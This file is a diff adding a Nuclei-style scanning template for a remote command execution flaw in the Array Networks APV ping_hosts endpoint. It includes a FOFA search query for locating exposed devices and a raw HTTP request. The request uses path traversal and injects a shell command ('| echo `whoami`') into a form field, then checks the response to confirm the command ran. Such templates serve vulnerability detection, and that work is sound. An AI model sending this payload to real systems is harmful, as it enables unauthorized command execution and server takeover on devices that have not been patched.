@@ -1,0 +1,27 @@
+id: array-networks-apv-rce
+
+info:
+  name: "Array Networks APV应用交付系统 ping_hosts接口命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Array-APV"
+          Array Networks APV应用交付系统的/rest/ping_hosts接口存在远程代码执行缺陷。攻击者可利用该漏洞在目标服务器上执行任意系统命令，通过代码注入实现后门植入，最终达成服务器权限获取与Web服务控制。该漏洞攻击复杂度较低，建议相关用户立即部署安全补丁
+  tags: Array
+
+http:
+- raw:
+  - |
+    POST /restapi/../rest/ping_hosts HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    ["127.0.0.1| echo `whoami` received 2 3 4"]=1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'whoami'
